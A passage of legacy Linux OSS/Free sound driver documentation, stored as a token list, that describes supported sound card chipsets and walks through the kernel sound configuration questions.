"cause", "a", "conflict", ".", "So", "check", "if", "your", "card", "is", "listed", "in", "this", "file", "before", "enabling", "the", "MSS", "support", ".", "Yamaha", "FM", "synthesizers", "(", "OPL2", ",", "OPL3", "(", "not", "OPL3", "-", "SA", ")", "and", "OPL4", ")", "Most", "sound", "cards", "have", "a", "FM", "synthesizer", "chip", ".", "The", "OPL2", "is", "a", "2", "operator", "chip", "used", "in", "the", "original", "AdLib", "card", ".", "Currently", "it", "'", "s", "used", "only", "in", "the", "cheapest", "(", "8", "bit", "mono", ")", "cards", ".", "The", "OPL3", "is", "a", "4", "operator", "FM", "chip", "which", "provides", "better", "sound", "quality", "and", "/", "or", "more", "available", "voices", "than", "the", "OPL2", ".", "The", "OPL4", "is", "a", "new", "chip", "that", "has", "an", "OPL3", "and", "a", "wave", "table", "synthesizer", "packed", "onto", "the", "same", "chip", ".", "The", "driver", "supports", "just", "the", "OPL3", "mode", "directly", ".", "Most", "cards", "with", "an", "OPL4", "(", "like", "SM", "Wave", "and", "AudioTrix", "Pro", ")", "support", "the", "OPL4", "mode", "using", "MPU401", "emulation", ".", "Writing", "a", "native", "OPL4", "support", "is", "difficult", "since", "Yamaha", "doesn", "'", "t", "give", "information", "about", "their", "sample", "ROM", "chip", ".", "Enable", "the", "generic", "OPL2", "/", "OPL3", "FM", "synthesizer", "support", "if", "your", "card", "has", "a", "FM", "chip", "made", "by", "Yamaha", ".", "Don", "'", "t", "enable", "it", "if", "your", "card", "has", "a", "software", "(", "TRS", ")", "based", "FM", "emulator", ".", "NOTE", "!", "OPL3", "-", "SA", "is", "different", "chip", "than", "the", "ordinary", "OPL3", ".", "In", "addition", "to", "the", "FM", "synth", "this", "chip", "has", "also", "digital", "audio", "(", "WSS", ")", "and", "MIDI", "(", "MPU401", ")", "capabilities", ".", "Support", "for", "OPL3", "-", "SA", "is", "described", "below", ".", "Yamaha", "OPL3", "-", "SA1", "Yamaha", "OPL3", "-", "SA1", "(", "YMF701", ")", "is", "an", "audio", "controller", "chip", "used", "on", "some", "(", "Intel", ")", "motherboards", "and", "on", "cheap", "sound", "cards", ".", "It", "should", "not", "be", "confused", "with", "the", "original", "OPL3", "chip", "(", "YMF278", ")", "which", "is", "entirely", "different", "chip", ".", "OPL3", "-", "SA1", "has", "support", "for", "MSS", ",", "MPU401", "and", "SB", "Pro", "(", "not", "used", "in", "OSS", "/", "Free", ")", "in", "addition", "to", "the", "OPL3", "FM", "synth", ".", "There", "are", "also", "chips", "called", "OPL3", "-", "SA2", ",", "OPL3", "-", "SA3", ",", ".", "..", ",", "OPL3SA", "-", "N", ".", "They", "are", "PnP", "chips", "and", "will", "not", "work", "with", "the", "OPL3", "-", "SA1", "driver", ".", "You", "should", "use", "the", "standard", "MSS", ",", "MPU401", "and", "OPL3", "options", "with", "these", "chips", "and", "to", "activate", "the", "card", "using", "isapnptools", ".", "4Front", "Technologies", "SoftOSS", "SoftOSS", "is", "a", "software", "based", "wave", "table", "emulation", "which", "works", "with", "any", "16", "bit", "stereo", "sound", "card", ".", "Due", "to", "its", "nature", "a", "fast", "CPU", "is", "required", "(", "P133", "is", "minimum", ")", ".", "Although", "SoftOSS", "does", "_not_", "use", "MMX", "instructions", "it", "has", "proven", "out", "that", "recent", "processors", "(", "which", "appear", "to", "have", "MMX", ")", "perform", "significantly", "better", "with", "SoftOSS", "than", "earlier", "ones", ".", "For", "example", "a", "P166MMX", "beats", "a", "PPro200", ".", "SoftOSS", "should", "not", "be", "used", "on", "486", "or", "386", "machines", ".", "The", "amount", "of", "CPU", "load", "caused", "by", "SoftOSS", "can", "be", "controlled", "by", "selecting", "the", "CONFIG_SOFTOSS_RATE", "and", "CONFIG_SOFTOSS_VOICES", "parameters", "properly", "(", "they", "will", "be", "prompted", "by", "make", "config", ")", ".", "It", "'", "s", "recommended", "to", "set", "CONFIG_SOFTOSS_VOICES", "to", "32", ".", "If", "you", "have", "a", "P166MMX", "or", "faster", "(", "PPro200", "is", "not", "faster", ")", "you", "can", "set", "CONFIG_SOFTOSS_RATE", "to", "44100", "(", "kHz", ")", ".", "However", "with", "slower", "systems", "it", "recommended", "to", "use", "sampling", "rates", "around", "22050", "or", "even", "16000", "kHz", ".", "Selecting", "too", "high", "values", "for", "these", "parameters", "may", "hang", "your", "system", "when", "playing", "MIDI", "files", "with", "hight", "degree", "of", "polyphony", "(", "number", "of", "concurrently", "playing", "notes", ")", ".", "It", "'", "s", "also", "possible", "to", "decrease", "CONFIG_SOFTOSS_VOICES", ".", "This", "makes", "it", "possible", "to", "use", "higher", "sampling", "rates", ".", "However", "using", "fewer", "voices", "decreases", "playback", "quality", "more", "than", "decreasing", "the", "sampling", "rate", ".", "SoftOSS", "keeps", "the", "samples", "loaded", "on", "the", "system", "'", "s", "RAM", "so", "much", "RAM", "is", "required", ".", "SoftOSS", "should", "never", "be", "used", "on", "machines", "with", "less", "than", "16", "MB", "of", "RAM", "since", "this", "is", "potentially", "dangerous", "(", "you", "may", "accidentally", "run", "out", "of", "memory", "which", "probably", "crashes", "the", "machine", ")", ".", "SoftOSS", "implements", "the", "wave", "table", "API", "originally", "designed", "for", "GUS", ".", "For", "this", "reason", "all", "applications", "designed", "for", "GUS", "should", "work", "(", "at", "least", "after", "minor", "modifications", ")", ".", "For", "example", "gmod", "/", "xgmod", "and", "playmidi", "-", "g", "are", "known", "to", "work", ".", "To", "work", "SoftOSS", "will", "require", "GUS", "compatible", "patch", "files", "to", "be", "installed", "on", "the", "system", "(", "in", "/", "dos", "/", "ultrasnd", "/", "midi", ")", ".", "You", "can", "use", "the", "public", "domain", "MIDIA", "patchset", "available", "from", "several", "ftp", "sites", ".", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "IMPORTANT", "NOTICE", "!", "The", "original", "patch", "set", "distributed", "with", "the", "Gravis", "Ultrasound", "card", "is", "not", "in", "public", "domain", "(", "even", "though", "it", "'", "s", "available", "from", "some", "FTP", "sites", ")", ".", "You", "should", "contact", "Voice", "Crystal", "(", "www", ".", "voicecrystal", ".", "com", ")", "if", "you", "like", "to", "use", "these", "patches", "with", "SoftOSS", "included", "in", "OSS", "/", "Free", ".", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "PSS", "based", "cards", "(", "AD1848", "+", "ADSP", "-", "2115", "+", "Echo", "ESC614", "ASIC", ")", "Analog", "Devices", "and", "Echo", "Speech", "have", "together", "defined", "a", "sound", "card", "architecture", "based", "on", "the", "above", "chips", ".", "The", "DSP", "chip", "is", "used", "for", "emulation", "of", "SB", "Pro", ",", "FM", "and", "General", "MIDI", "/", "MT32", ".", "There", "are", "several", "cards", "based", "on", "this", "architecture", ".", "The", "most", "known", "ones", "are", "Orchid", "SW32", "and", "Cardinal", "DSP16", ".", "The", "driver", "supports", "downloading", "DSP", "algorithms", "to", "these", "cards", ".", "NOTE", "!", "You", "will", "have", "to", "use", "the", "\"", "old", "\"", "config", "script", "when", "configuring", "PSS", "cards", ".", "MediaTrix", "AudioTrix", "Pro", "The", "ATP", "card", "is", "built", "around", "a", "CS4231", "codec", "and", "an", "OPL4", "synthesizer", "chips", ".", "The", "OPL4", "mode", "is", "supported", "by", "a", "microcontroller", "running", "a", "General", "MIDI", "emulator", ".", "There", "is", "also", "a", "SB", "1", ".", "5", "compatible", "playback", "mode", ".", "Ensoniq", "SoundScape", "and", "compatibles", "Ensoniq", "has", "designed", "a", "sound", "card", "architecture", "based", "on", "the", "OTTO", "synthesizer", "chip", "used", "in", "their", "professional", "MIDI", "synthesizers", ".", "Several", "companies", "(", "including", "Ensoniq", ",", "Reveal", "and", "Spea", ")", "are", "selling", "cards", "based", "on", "this", "architecture", ".", "NOTE", "!", "The", "SoundScape", "PnP", "is", "not", "supported", "by", "OSS", "/", "Free", ".", "Ensoniq", "VIVO", "and", "VIVO90", "cards", "are", "not", "compatible", "with", "Soundscapes", "so", "the", "Soundscape", "driver", "will", "not", "work", "with", "them", ".", "You", "may", "want", "to", "use", "OSS", "/", "Linux", "with", "these", "cards", ".", "OPTi", "MAD16", "and", "Mozart", "based", "cards", "The", "Mozart", "(", "OAK", "OTI", "-", "601", ")", ",", "MAD16", "(", "OPTi", "82C928", ")", ",", "MAD16", "Pro", "(", "OPTi", "82C929", ")", ",", "OPTi", "82C924", "/", "82C925", "(", "in", "_non_", "PnP", "mode", ")", "and", "OPTi", "82C930", "interface", "chips", "are", "used", "in", "many", "different", "sound", "cards", ",", "including", "some", "cards", "by", "Reveal", "miro", "and", "Turtle", "Beach", "(", "Tropez", ")", ".", "The", "purpose", "of", "these", "chips", "is", "to", "connect", "other", "audio", "components", "to", "the", "PC", "bus", ".", "The", "interface", "chip", "performs", "address", "decoding", "for", "the", "other", "chips", ".", "NOTE", "!", "Tropez", "Plus", "is", "not", "MAD16", "but", "CS4232", "based", ".", "NOTE", "!", "MAD16", "PnP", "cards", "(", "82C924", ",", "82C925", ",", "82C931", ")", "are", "not", "MAD16", "compatible", "in", "the", "PnP", "mode", ".", "You", "will", "have", "to", "use", "them", "in", "MSS", "mode", "after", "having", "initialized", "them", "using", "isapnptools", "or", "DOS", ".", "82C931", "probably", "requires", "initialization", "using", "DOS", "/", "Windows", "(", "running", "isapnptools", "is", "not", "enough", ")", ".", "It", "'", "s", "possible", "to", "use", "82C931", "with", "OSS", "/", "Free", "by", "jumpering", "it", "to", "non", "-", "PnP", "mode", "(", "provided", "that", "the", "card", "has", "a", "jumper", "for", "this", ")", ".", "In", "non", "-", "PnP", "mode", "82C931", "is", "compatible", "with", "82C930", "and", "should", "work", "with", "the", "MAD16", "driver", "(", "without", "need", "to", "use", "isapnptools", "or", "DOS", "to", "initialize", "it", ")", ".", "All", "OPTi", "chips", "are", "supported", "by", "OSS", "/", "Linux", "(", "both", "in", "PnP", "and", "non", "-", "PnP", "modes", ")", ".", "Audio", "Excel", "DSP16", "Support", "for", "this", "card", "was", "written", "by", "Riccardo", "Faccetti", "(", "riccardo", "@", "cdc8g5", ".", "cdc", ".", "polimi", ".", "it", ")", ".", "The", "AEDSP16", "driver", "included", "in", "the", "lowlevel", "/", "directory", ".", "To", "use", "it", "you", "should", "enable", "the", "\"", "Additional", "low", "level", "drivers", "\"", "option", ".", "Crystal", "CS4232", "and", "CS4236", "based", "cards", "such", "as", "AcerMagic", "S23", ",", "TB", "Tropez", "_Plus_", "and", "many", "PC", "motherboards", "(", "Compaq", ",", "HP", ",", "Intel", ",", ".", "..", ")", "CS4232", "is", "a", "PnP", "multimedia", "chip", "which", "contains", "a", "CS3231A", "codec", ",", "SB", "and", "MPU401", "emulations", ".", "There", "is", "support", "for", "OPL3", "too", ".", "Unfortunately", "the", "MPU401", "mode", "doesn", "'", "t", "work", "(", "I", "don", "'", "t", "know", "how", "to", "initialize", "it", ")", ".", "CS4236", "is", "an", "enhanced", "(", "compatible", ")", "version", "of", "CS4232", ".", "NOTE", "!", "Don", "'", "t", "ever", "try", "to", "use", "isapnptools", "with", "CS4232", "since", "this", "will", "just", "freeze", "your", "machine", "(", "due", "to", "chip", "bugs", ")", ".", "If", "you", "have", "problems", "in", "getting", "CS4232", "working", "you", "could", "try", "initializing", "it", "with", "DOS", "(", "CS4232C", ".", "EXE", ")", "and", "then", "booting", "Linux", "using", "loadlin", ".", "CS4232C", ".", "EXE", "loads", "a", "secret", "firmware", "patch", "which", "is", "not", "documented", "by", "Crystal", ".", "Turtle", "Beach", "Maui", "and", "Tropez", "\"", "classic", "\"", "This", "driver", "version", "supports", "sample", ",", "patch", "and", "program", "loading", "commands", "described", "in", "the", "Maui", "/", "Tropez", "User", "'", "s", "manual", ".", "There", "is", "now", "full", "initialization", "support", "too", ".", "The", "audio", "side", "of", "the", "Tropez", "is", "based", "on", "the", "MAD16", "chip", "(", "see", "above", ")", ".", "NOTE", "!", "Tropez", "Plus", "is", "different", "card", "than", "Tropez", "\"", "classic", "\"", "and", "will", "not", "work", "fully", "in", "Linux", ".", "You", "can", "get", "audio", "features", "working", "by", "configuring", "the", "card", "as", "a", "CS4232", "based", "card", "(", "above", ")", ".", "Jumpers", "and", "software", "configuration", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Some", "of", "the", "earliest", "sound", "cards", "were", "jumper", "configurable", ".", "You", "have", "to", "configure", "the", "driver", "use", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", "that", "match", "the", "jumpers", ".", "Just", "few", "8", "bit", "cards", "are", "fully", "jumper", "configurable", "(", "SB", "1", ".", "x", "/", "2", ".", "x", ",", "SB", "Pro", "and", "clones", ")", ".", "Some", "cards", "made", "by", "Aztech", "have", "an", "EEPROM", "which", "contains", "the", "config", "info", ".", "These", "cards", "behave", "much", "like", "hardware", "jumpered", "cards", ".", "Most", "cards", "have", "jumper", "for", "the", "base", "I", "/", "O", "address", "but", "other", "parameters", "are", "software", "configurable", ".", "Sometimes", "there", "are", "few", "other", "jumpers", "too", ".", "Latest", "cards", "are", "fully", "software", "configurable", "or", "they", "are", "PnP", "ISA", "compatible", ".", "There", "are", "no", "jumpers", "on", "the", "board", ".", "The", "driver", "handles", "software", "configurable", "cards", "automatically", ".", "Just", "configure", "the", "driver", "to", "use", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", "which", "are", "known", "to", "work", ".", "You", "could", "usually", "use", "the", "same", "values", "than", "with", "DOS", "and", "/", "or", "Windows", ".", "Using", "different", "settings", "is", "possible", "but", "not", "recommended", "since", "it", "may", "cause", "some", "trouble", "(", "for", "example", "when", "warm", "booting", "from", "an", "OS", "to", "another", "or", "when", "installing", "new", "hardware", "to", "the", "machine", ")", ".", "Sound", "driver", "sets", "the", "soft", "configurable", "parameters", "of", "the", "card", "automatically", "during", "boot", ".", "Usually", "you", "don", "'", "t", "need", "to", "run", "any", "extra", "initialization", "programs", "when", "booting", "Linux", "but", "there", "are", "some", "exceptions", ".", "See", "the", "card", "-", "specific", "instructions", "below", "for", "more", "info", ".", "The", "drawback", "of", "software", "configuration", "is", "that", "the", "driver", "needs", "to", "know", "how", "the", "card", "must", "be", "initialized", ".", "It", "cannot", "initialize", "unknown", "cards", "even", "if", "they", "are", "otherwise", "compatible", "with", "some", "other", "cards", "(", "like", "SB", ",", "MPU401", "or", "Windows", "Sound", "System", ")", ".", "What", "if", "your", "card", "was", "not", "listed", "above", "?", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "The", "first", "thing", "to", "do", "is", "to", "look", "at", "the", "major", "IC", "chips", "on", "the", "card", ".", "Many", "of", "the", "latest", "sound", "cards", "are", "based", "on", "some", "standard", "chips", ".", "If", "you", "are", "lucky", ",", "all", "of", "them", "could", "be", "supported", "by", "the", "driver", ".", "The", "most", "common", "ones", "are", "the", "OPTi", "MAD16", ",", "Mozart", ",", "SoundScape", "(", "Ensoniq", ")", "and", "the", "PSS", "architectures", "listed", "above", ".", "Also", "look", "at", "the", "end", "of", "this", "file", "for", "list", "of", "unsupported", "cards", "and", "the", "ones", "which", "could", "be", "supported", "later", ".", "The", "last", "resort", "is", "to", "send", "_exact_", "name", "and", "model", "information", "of", "the", "card", "to", "me", "together", "with", "a", "list", "of", "the", "major", "IC", "chips", "(", "manufactured", ",", "model", ")", "to", "me", ".", "I", "could", "then", "try", "to", "check", "if", "your", "card", "looks", "like", "something", "familiar", ".", "There", "are", "many", "more", "cards", "in", "the", "world", "than", "listed", "above", ".", "The", "first", "thing", "to", "do", "with", "these", "cards", "is", "to", "check", "if", "they", "emulate", "some", "other", "card", "or", "interface", "such", "as", "SB", ",", "MSS", "and", "/", "or", "MPU401", ".", "In", "this", "case", "there", "is", "a", "chance", "to", "get", "the", "card", "to", "work", "by", "booting", "DOS", "before", "starting", "Linux", "(", "boot", "DOS", ",", "hit", "ctrl", "-", "alt", "-", "del", "and", "boot", "Linux", "without", "hard", "resetting", "the", "machine", ")", ".", "In", "this", "method", "the", "DOS", "based", "driver", "initializes", "the", "hardware", "to", "use", "known", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", ".", "If", "sound", "driver", "is", "configured", "to", "use", "the", "same", "settings", ",", "everything", "should", "work", "OK", ".", "Configuring", "sound", "driver", "(", "with", "Linux", ")", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "The", "sound", "driver", "is", "currently", "distributed", "as", "part", "of", "the", "Linux", "kernel", ".", "The", "files", "are", "in", "/", "usr", "/", "src", "/", "linux", "/", "drivers", "/", "sound", "/", ".", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "ALWAYS", "USE", "THE", "SOUND", "DRIVER", "VERSION", "WHICH", "IS", "DISTRIBUTED", "WITH", "*", "*", "THE", "KERNEL", "SOURCE", "PACKAGE", "YOU", "ARE", "USING", ".", "SOME", "ALPHA", "AND", "BETA", "TEST", "*", "*", "VERSIONS", "CAN", "BE", "INSTALLED", "FROM", "A", "SEPARATELY", "DISTRIBUTED", "PACKAGE", "*", "*", "BUT", "CHECK", "THAT", "THE", "PACKAGE", "IS", "NOT", "MUCH", "OLDER", "(", "OR", "NEWER", ")", "THAN", "THE", "*", "*", "KERNEL", "YOU", "ARE", "USING", ".", "IT", "'", "S", "POSSIBLE", "THAT", "THE", "KERNEL", "/", "DRIVER", "*", "*", "INTERFACE", "CHANGES", "BETWEEN", "KERNEL", "RELEASES", "WHICH", "MAY", "CAUSE", "SOME", "*", "*", "INCOMPATIBILITY", "PROBLEMS", ".", "*", "*", "*", "*", "IN", "CASE", "YOU", "INSTALL", "A", "SEPARATELY", "DISTRIBUTED", "SOUND", "DRIVER", "VERSION", ",", "*", "*", "BE", "SURE", "TO", "REMOVE", "OR", "RENAME", "THE", "OLD", "SOUND", "DRIVER", "DIRECTORY", "BEFORE", "*", "*", "INSTALLING", "THE", "NEW", "ONE", ".", "LEAVING", "OLD", "FILES", "TO", "THE", "SOUND", "DRIVER", "*", "*", "DIRECTORY", "_WILL_", "CAUSE", "PROBLEMS", "WHEN", "THE", "DRIVER", "IS", "USED", "OR", "*", "*", "COMPILED", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "To", "configure", "the", "driver", ",", "run", "\"", "make", "config", "\"", "in", "the", "kernel", "source", "directory", "(", "/", "usr", "/", "src", "/", "linux", ")", ".", "Answer", "\"", "y", "\"", "or", "\"", "m", "\"", "to", "the", "question", "about", "Sound", "card", "support", "(", "after", "the", "questions", "about", "mouse", ",", "CD", "-", "ROM", ",", "ftape", ",", "etc", ".", "support", ")", ".", "Questions", "about", "options", "for", "sound", "will", "then", "be", "asked", ".", "After", "configuring", "the", "kernel", "and", "sound", "driver", "and", "compile", "the", "kernel", "following", "instructions", "in", "the", "kernel", "README", ".", "The", "sound", "driver", "configuration", "dialog", "Sound", "configuration", "starts", "by", "making", "some", "yes", "/", "no", "questions", ".", "Be", "careful", "when", "answering", "to", "these", "questions", "since", "answering", "y", "to", "a", "question", "may", "prevent", "some", "later", "ones", "from", "being", "asked", ".", "For", "example", "don", "'", "t", "answer", "y", "to", "the", "first", "question", "(", "PAS16", ")", "if", "you", "don", "'", "t", "really", "have", "a", "PAS16", ".", "Don", "'", "t", "enable", "more", "cards", "than", "you", "really", "need", "since", "they", "just", "consume", "memory", ".", "Also", "some", "drivers", "(", "like", "MPU401", ")", "may", "conflict", "with", "your", "SCSI", "controller", "and", "prevent", "kernel", "from", "booting", ".", "If", "you", "card", "was", "in", "the", "list", "of", "supported", "cards", "(", "above", ")", ",", "please", "look", "at", "the", "card", "specific", "config", "instructions", "(", "later", "in", "this", "file", ")", "before", "starting", "to", "configure", ".", "Some", "cards", "must", "be", "configured", "in", "way", "which", "is", "not", "obvious", ".", "So", "here", "is", "the", "beginning", "of", "the", "config", "dialog", ".", "Answer", "'", "y", "'", "or", "'", "n", "'", "to", "these", "questions", ".", "The", "default", "answer", "is", "shown", "so", "that", "(", "y", "/", "n", ")", "means", "'", "y", "'", "by", "default", "and", "(", "n", "/", "y", ")", "means", "'", "n", "'", ".", "To", "use", "the", "default", "value", ",", "just", "hit", "ENTER", ".", "But", "be", "careful", "since", "using", "the", "default", "_doesn", "'", "t_", "guarantee", "anything", ".", "Note", "also", "that", "all", "questions", "may", "not", "be", "asked", ".", "The", "configuration", "program", "may", "disable", "some", "questions", "depending", "on", "the", "earlier", "choices", ".", "It", "may", "also", "select", "some", "options", "automatically", "as", "well", ".", "\"", "ProAudioSpectrum", "16", "support", "\"", ",", "-", "Answer", "'", "y", "'", "_ONLY_", "if", "you", "have", "a", "Pro", "Audio", "Spectrum", "_16_", ",", "Pro", "Audio", "Studio", "16", "or", "Logitech", "SoundMan", "16", "(", "be", "sure", "that", "you", "read", "the", "above", "list", "correctly", ")", ".", "Don", "'", "t", "answer", "'", "y", "'", "if", "you", "have", "some", "other", "card", "made", "by", "Media", "Vision", "or", "Logitech", "since", "they", "are", "not", "PAS16", "compatible", ".", "NOTE", "!", "Since", "3", ".", "5", "-", "beta10", "you", "need", "to", "enable", "SB", "support", "(", "next", "question", ")", "if", "you", "want", "to", "use", "the", "SB", "emulation", "of", "PAS16", ".", "It", "'", "s", "also", "possible", "to", "the", "emulation", "if", "you", "want", "to", "use", "a", "true", "SB", "card", "together", "with", "PAS16", "(", "there", "is", "another", "question", "about", "this", "that", "is", "asked", "later", ")", ".", "\"", "Sound", "Blaster", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "you", "have", "an", "original", "SB", "card", "made", "by", "Creative", "Labs", "or", "a", "full", "100", "%", "hardware", "compatible", "clone", "(", "like", "Thunderboard", "or", "SM", "Games", ")", ".", "If", "your", "card", "was", "in", "the", "list", "of", "supported", "cards", "(", "above", ")", ",", "please", "look", "at", "the", "card", "specific", "instructions", "later", "in", "this", "file", "before", "answering", "this", "question", ".", "For", "an", "unknown", "card", "you", "may", "answer", "'", "y", "'", "if", "the", "card", "claims", "to", "be", "SB", "compatible", ".", "Enable", "this", "option", "also", "with", "PAS16", "(", "changed", "since", "v3", ".", "5", "-", "beta9", ")", ".", "Don", "'", "t", "enable", "SB", "if", "you", "have", "a", "MAD16", "or", "Mozart", "compatible", "card", ".", "\"", "Generic", "OPL2", "/", "OPL3", "FM", "synthesizer", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "your", "card", "has", "a", "FM", "chip", "made", "by", "Yamaha", "(", "OPL2", "/", "OPL3", "/", "OPL4", ")", ".", "Answering", "'", "y", "'", "is", "usually", "a", "safe", "and", "recommended", "choice", ".", "However", "some", "cards", "may", "have", "software", "(", "TSR", ")", "FM", "emulation", ".", "Enabling", "FM", "support", "with", "these", "cards", "may", "cause", "trouble", ".", "However", "I", "don", "'", "t", "currently", "know", "such", "cards", ".", "\"", "Gravis", "Ultrasound", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "you", "have", "GUS", "or", "GUS", "MAX", ".", "Answer", "'", "n", "'", "if", "you", "don", "'", "t", "have", "GUS", "since", "the", "GUS", "driver", "consumes", "much", "memory", ".", "Currently", "I", "don", "'", "t", "have", "experiences", "with", "the", "GUS", "ACE", "so", "I", "don", "'", "t", "know", "what", "to", "answer", "with", "it", ".", "\"", "MPU", "-", "401", "support", "(", "NOT", "for", "SB16", ")", "\",", "-", "Be", "careful", "with", "this", "question", ".", "The", "MPU401", "interface", "is", "supported", "by", "almost", "any", "sound", "card", "today", ".", "However", "some", "natively", "supported", "cards", "have", "their", "own", "driver", "for", "MPU401", ".", "Enabling", "the", "MPU401", "option", "with", "these", "cards", "will", "cause", "a", "conflict", ".", "Also", "enabling", "MPU401", "on", "a", "system", "that", "doesn", "'", "t", "really", "have", "a", "MPU401", "could", "cause", "some", "trouble", ".", "If", "your", "card", "was", "in", "the", "list", "of", "supported", "cards", "(", "above", ")", ",", "please", "look", "at", "the", "card", "specific", "instructions", "later", "in", "this", "file", ".", "In", "MOST", "cases", "this", "MPU401", "driver", "should", "only", "be", "used", "with", "\"", "true", "\"", "MIDI", "-", "only", "MPU401", "professional", "cards", ".", "In", "most", "other", "cases", "there", "is", "another", "way", "to", "get", "the", "MPU401", "compatible", "interface", "of", "a", "sound", "card", "to", "work", ".", "Support", "for", "the", "MPU401", "compatible", "MIDI", "port", "of", "SB16", ",", "ESS1688", "and", "MV", "Jazz16", "cards", "is", "included", "in", "the", "SB", "driver", ".", "Use", "it", "instead", "of", "this", "separate", "MPU401", "driver", "with", "these", "cards", ".", "As", "well", "Soundscape", ",", "PSS", "and", "Maui", "drivers", "include", "their", "own", "MPU401", "options", ".", "It", "'", "s", "safe", "to", "answer", "'", "y", "'", "if", "you", "have", "a", "true", "MPU401", "MIDI", "interface", "card", ".", "\"", "6850", "UART", "Midi", "support", "\"", ",", "-", "It", "'", "s", "safe", "to", "answer", "'", "n", "'", "to", "this", "question", "in", "all", "cases", ".", "The", "6850", "UART", "interface", "is", "so", "rarely", "used", ".", "\"", "PSS", "(", "ECHO", "-", "ADI2111", ")", "support", "\"", ",", "-", "Answer", "'", "y", "'", "only", "if", "you", "have", "Orchid", "SW32", ",", "Cardinal", "DSP16", "or", "some", "other", "card", "based", "on", "the", "PSS", "chipset", "(", "AD1848", "codec", "+", "ADSP", "-", "2115", "DSP", "chip", "+", "Echo", "ESC614", "ASIC", "CHIP", ")", ".", "\"", "16", "bit", "sampling", "option", "of", "GUS", "(", "_NOT_", "GUS", "MAX", ")", "\",", "-", "Answer", "'", "y", "'", "if", "you", "have", "installed", "the", "16", "bit", "sampling", "daughtercard", "to", "your", "GUS", ".", "Answer", "'", "n", "'", "if", "you", "have", "GUS", "MAX", ".", "Enabling", "this", "option", "disables", "GUS", "MAX", "support", ".", "\"", "GUS", "MAX", "support", "\"", ",", "-", "Answer", "'", "y", "'", "only", "if", "you", "have", "a", "GUS", "MAX", ".", "\"", "Microsoft", "Sound", "System", "support", "\"", ",", "-", "Again", "think", "carefully", "before", "answering", "'", "y", "'", "to", "this", "question", ".", "It", "'", "s", "safe", "to", "answer", "'", "y", "'", "in", "case", "you", "have", "the", "original", "Windows", "Sound", "System", "card", "made", "by", "Microsoft", "or", "Aztech", "SG", "16", "Pro", "(", "or", "NX16", "Pro", ")", ".", "Also", "you", "may", "answer", "'", "y", "'", "in", "case", "your", "card", "was", "not", "listed", "earlier", "in", "this", "file", ".", "For", "cards", "having", "native", "support", "in", "the", "driver", ",", "consult", "the", "card", "specific", "instructions", "later", "in", "this", "file", ".", "Some", "drivers", "have", "their", "own", "MSS", "support", "and", "enabling", "this", "option", "will", "cause", "a", "conflict", ".", "Note", "!", "The", "MSS", "driver", "permits", "configuring", "two", "DMA", "channels", ".", "This", "is", "a", "\"", "nonstandard", "\"", "feature", "and", "works", "only", "with", "very", "few", "cards", "(", "if", "any", ")", ".", "In", "most", "cases", "the", "second", "DMA", "channel", "should", "be", "disabled", "or", "set", "to", "the", "same", "channel", "than", "the", "first", "one", ".", "Trying", "to", "configure", "two", "separate", "channels", "with", "cards", "that", "don", "'", "t", "support", "this", "feature", "will", "prevent", "audio", "(", "at", "least", "recording", ")", "from", "working", ".", "\"", "Ensoniq", "Soundscape", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "you", "have", "a", "sound", "card", "based", "on", "the", "Ensoniq", "SoundScape", "chipset", ".", "Such", "cards", "are", "being", "manufactured", "at", "least", "by", "Ensoniq", ",", "Spea", "and", "Reveal", "(", "note", "that", "Reveal", "makes", "other", "cards", "also", ")", ".", "The", "oldest", "cards", "made", "by", "Spea", "don", "'", "t", "work", "properly", "with", "Linux", ".", "Soundscape", "PnP", "as", "well", "as", "Ensoniq", "VIVO", "work", "only", "with", "the", "commercial", "OSS", "/", "Linux", "version", ".", "\"", "MediaTrix", "AudioTrix", "Pro", "support", "\"", ",", "-", "Answer", "'", "y", "'", "if", "you", "have", "the", "AudioTrix", "Pro", ".", "\"", "Support", "for", "MAD16", "and", "/", "or", "Mozart", "based", "cards", "\"", ",", "-", "Answer", "y", "if", "your", "card", "has", "a", "Mozart", "(", "OAK", "OTI", "-", "601", ")", "or", "MAD16", "(", "OPTi", "82C928", ",", "82C929", ",", "82C924", "/", "82C925", "or", "82C930", ")", "audio", "interface", "chip", ".", "These", "chips", "are", "currently", "quite", "common", "so", "it", "'", "s", "possible", "that", "many", "no", "-", "name", "cards", "have", "one", "of", "them", ".", "In", "addition", "the", "MAD16", "chip", "is", "used", "in", "some", "cards", "made", "by", "known", "manufacturers", "such", "as", "Turtle", "Beach", "(", "Tropez", ")", ",", "Reveal", "(", "some", "models", ")", "and", "Diamond", "(", "some", "recent", "models", ")", ".", "Note", "OPTi", "82C924", "and", "82C925", "are", "MAD16", "compatible", "only", "in", "non", "PnP", "mode", "(", "jumper", "selectable", "on", "many", "cards", ")", ".", "\"", "Support", "for", "TB", "Maui", "\"", "-", "This", "enables", "TB", "Maui", "specific", "initialization", ".", "Works", "with", "TB", "Maui", "and", "TB", "Tropez", "(", "may", "not", "work", "with", "Tropez", "Plus", ")", ".", "Then", "the", "configuration", "program", "asks", "some", "y", "/", "n", "questions", "about", "the", "higher", 